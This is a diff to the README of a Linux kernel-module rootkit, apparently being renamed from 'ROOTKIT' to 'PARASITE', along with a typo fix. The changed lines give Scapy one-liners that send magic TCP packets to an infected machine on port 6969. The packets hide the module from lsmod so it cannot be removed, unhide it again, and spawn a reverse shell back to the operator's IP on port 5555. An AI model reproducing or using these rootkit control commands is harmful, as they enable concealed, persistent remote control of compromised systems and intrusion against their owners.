@@ -8,7 +8,7 @@ Works with kernel versions 5.0 and greater, tested and built natively on 5.4.0 (
 
 The following steps assume that you have already assumed root
 
-1. Update your system via your respective packaeg-manager, and ensure linux-headers is installed
+1. Update your system via your respective package-manager, and ensure linux-headers is installed
 ```sh
 apt update && apt upgrade && apt install linux-headers-$(uname -r) -y
 ```
@@ -51,19 +51,19 @@ Note: You *must* replace **INSERT_IP** with the rootkit-infected machine's IP
 
 
 
-- ROOTKIT_HIDE - Hides the module from lsmod, thus inherently prevents it from being removed via rmmod as well
+- PARASITE_HIDE - Hides the module from lsmod, thus inherently prevents it from being removed via rmmod as well
 ```
-sr1(IP(dst="INSERT_IP")/TCP(dport=6969)/Raw(load='ROOTKIT_HIDE'))
-```
-
-- ROOTKIT_SHOW - Puts LKM back into list, thus allowing for removal via rmmod
-```
-sr1(IP(dst="INSERT_IP")/TCP(dport=6969)/Raw(load='ROOTKIT_SHOW'))
+sr1(IP(dst="INSERT_IP")/TCP(dport=6969)/Raw(load='PARASITE_HIDE'))
 ```
 
-- ROOTKIT_RSHELL127.0.0.1 - This spawns a reverse shell using your IP (change 127.0.0.1 to your IP). You will need to be listening for port 5555 (default) on your machine to catch the shell
+- PARASITE_SHOW - Puts LKM back into list, thus allowing for removal via rmmod
 ```
-sr1(IP(dst="INSERT_IP")/TCP(dport=6969)/Raw(load='ROOTKIT_RSHELL127.0.0.1))
+sr1(IP(dst="INSERT_IP")/TCP(dport=6969)/Raw(load='PARASITE_SHOW'))
+```
+
+- PARASITE_RSHELL127.0.0.1 - This spawns a reverse shell using your IP (change 127.0.0.1 to your IP). You will need to be listening for port 5555 (default) on your machine to catch the shell
+```
+sr1(IP(dst="INSERT_IP")/TCP(dport=6969)/Raw(load='PARASITE_RSHELL127.0.0.1))
 ```
 
 ## Uninstallation
